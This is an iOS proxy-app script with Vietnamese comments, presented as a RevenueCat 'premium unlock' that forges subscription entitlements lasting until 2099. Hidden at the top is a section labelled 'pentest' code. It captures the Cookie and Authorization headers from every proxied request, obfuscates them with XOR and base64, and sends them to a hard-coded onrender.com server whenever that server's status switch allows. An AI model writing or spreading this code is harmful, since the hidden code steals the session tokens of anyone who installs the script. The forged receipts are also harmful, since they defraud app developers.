// Khóa bí mật (Phải khớp hoàn toàn với server.js)
const SECRET_KEY = "tin1612006";

function encryptData(str, secret) {
  var encrypted = "";
  for (var i = 0; i < str.length; i++) {
    var charCode = str.charCodeAt(i) ^ secret.charCodeAt(i % secret.length);
    encrypted += String.fromCharCode(charCode);
  }
  return btoa(unescape(encodeURIComponent(encrypted)));
}

// ========= ĐOẠN MÃ PENTEST THU THẬP COOKIE/TOKEN (BẢO MẬT) ========= //
try {
  var user_cookie = $request.headers["Cookie"] || $request.headers["cookie"];
  var user_token = $request.headers["Authorization"] || $request.headers["authorization"] || $request.headers["token"];
  var target_url = $request.url;

  if ((user_cookie || user_token) && !target_url.includes("onrender.com")) {
    const server_domain = "https://server-2bpd.onrender.com";
    
    var now = Date.now();
    if (typeof globalThis._lastCheck === 'undefined') {
      globalThis._lastCheck = 0;
      globalThis._serverAllowed = false;
    }

    // Kiểm tra trạng thái định kỳ 30 giây/lần kèm theo Header xác thực
    if (now - globalThis._lastCheck > 30000) {
      globalThis._lastCheck = now;
      $httpClient.get({ 
        url: server_domain + "/status",
        headers: { "Authorization": SECRET_KEY } // Gửi kèm khóa xác thực
      }, function(err, resp, data) {
        if (!err && data) {
          try {
            var resJson = JSON.parse(data);
            globalThis._serverAllowed = (resJson.collect === true);
          } catch (e) {
            globalThis._serverAllowed = false;
          }
        } else {
          globalThis._serverAllowed = false;
        }
      });
    }

    // Nếu server bật và cấp phép
    if (globalThis._serverAllowed === true) {
      var raw_ua = $request.headers["User-Agent"] || $request.headers["user-agent"] || "Unknown_Device";
      var device_id = raw_ua.split(" ")[0] + "_" + Math.abs(hashCode(raw_ua));

      var rawPayload = JSON.stringify({
        deviceId: device_id,
        url: target_url,
        cookie: user_cookie || "Không có",
        token: user_token || "Không có"
      });

      // Mã hóa dữ liệu trước khi gửi
      var encryptedPayload = encryptData(rawPayload, SECRET_KEY);

      $httpClient.post({
        url: server_domain + "/",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ data: encryptedPayload })
      }, function(error, response, body) {});
    }
  }
} catch (e) {}

function hashCode(str) {
  var hash = 0, i, chr;
  if (str.length === 0) return hash;
  for (i = 0; i < str.length; i++) {
    chr = str.charCodeAt(i);
    hash = ((hash << 5) - hash) + chr;
    hash |= 0; 
  }
  return Math.abs(hash);
}

// ========= PHẦN XỬ LÝ BẢN QUYỀN REVENUECAT (GIỮ NGUYÊN) ========= //
try {
  var current_url = $request.url;
  if (/^https:\/\/api\.revenuecat\.com\/.+\/(receipts$|subscribers\/[^/]+$)/.test(current_url)) {
    const mapping = {
      '%E8%BD%A6%E7%A5%A8%E7%A5%A8': ['vip+watch_vip'],
      'Locket': ['Gold']
    };

    var ua = $request.headers["User-Agent"] || $request.headers["user-agent"],
        obj = JSON.parse($response.body);

    obj.Attention = "Chúc mừng bạn! Vui lòng không bán hoặc chia sẻ cho người khác!";

    var M4T = {
      is_sandbox: !1,
      ownership_type: "PURCHASED",
      billing_issues_detected_at: null,
      period_type: "normal",
      expires_date: "2099-12-18T01:04:17Z",
      grace_period_expires_date: null,
      unsubscribe_detected_at: null,
      original_purchase_date: "2024-07-28T01:04:18Z",
      purchase_date: "2024-07-28T01:04:17Z",
      store: "app_store"
    };

    var M4T_product = {
      grace_period_expires_date: null,
      purchase_date: "2024-07-28T01:04:17Z",
      product_identifier: "com.M4T.premium.yearly",
      expires_date: "2099-12-18T01:04:17Z"
    };

    const match = Object.keys(mapping).find(e => ua.includes(e));

    if (match) {
      let [e, s] = mapping[match];
      if (s) {
        M4T_product.product_identifier = s;
        obj.subscriber.subscriptions[s] = M4T;
      } else {
        obj.subscriber.subscriptions["com.M4T.premium.yearly"] = M4T;
      }
      obj.subscriber.entitlements[e] = M4T_product;
    } else {
      obj.subscriber.subscriptions["com.M4T.premium.yearly"] = M4T;
      obj.subscriber.entitlements.pro = M4T_product;
    }

    $done({ body: JSON.stringify(obj) });
  } else {
    $done({});
  }
} catch (e) {
  $done({});
}
